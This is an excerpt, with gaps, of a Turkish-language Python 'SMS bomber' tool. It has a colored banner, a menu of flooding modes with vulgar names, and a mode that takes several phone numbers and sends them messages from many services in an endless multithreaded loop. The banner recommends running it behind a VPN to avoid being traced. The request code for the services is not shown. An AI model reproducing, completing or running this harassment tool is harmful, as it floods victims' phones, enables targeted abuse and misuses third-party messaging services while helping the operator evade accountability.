...
while 1:
    ...
    ║  {Fore.YELLOW}SEXS! Aracı{Fore.LIGHTCYAN_EX}                                        ║
    ║  {Fore.GREEN}KARŞININ NUMARISINI BİL GERİSİNİZ BANA BIRAK :){Fore.LIGHTCYAN_EX}    ║
    ║  {Fore.RED}Bu tool METÖ Tarafından Modifiye Edilmiştir.{Fore.LIGHTCYAN_EX}       ║
    ║  {Fore.BLUE}Bu tool' u VPN ile kullanmanızı öneririz.{Fore.LIGHTCYAN_EX}          ║
    ║  {Fore.LIGHTMAGENTA_EX}█████████████████████████████████████████████{Fore.LIGHTCYAN_EX}      ║
    ╚═════════════════════════════════════════════════════╝
    {Style.RESET_ALL}""")

    try:
        menu = (input(Fore.LIGHTMAGENTA_EX + " 1- SMS Gönder (Normal Mod)\n\n 2- SMS Gönder (Bass Mod)\n\n 3- SMS Gönder (Anasını Sikme Modu)\n\n 4- Çıkış\n\n CallBomber(Yakında)\n\n" + Fore.LIGHTYELLOW_EX + " Seçim: "))
        if menu == "":
            continue
        menu = int(menu) 
    except ValueError:
    ...
    # Anasını sikme modu - GELİŞMİŞ VERSİYON
    elif menu == 3:
        system("cls||clear")
        tel_liste = []
        
        print(Fore.LIGHTYELLOW_EX + "Kaç adet telefon numarası sikmek istiyorsun?: "+ Fore.LIGHTGREEN_EX, end="")
        try:
            tel_sayisi = int(input())
            if tel_sayisi <= 0:
                raise ValueError
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş. Pozitif bir sayı giriniz.") 
            sleep(3)
            continue
        
        for i in range(tel_sayisi):
            system("cls||clear")
            print(Fore.LIGHTYELLOW_EX + f"{i+1}. telefon numarasını yaz (+90 sız): "+ Fore.LIGHTGREEN_EX, end="")
            tel_no = input()
            try:
                int(tel_no)
                if len(tel_no) != 10:
        ...
        # Tüm numaralar için SMS gönderme
        try:
            while True:
                with ThreadPoolExecutor() as executor:
                    futures = []
                    
                    # Her numara için tüm servisleri çalıştır
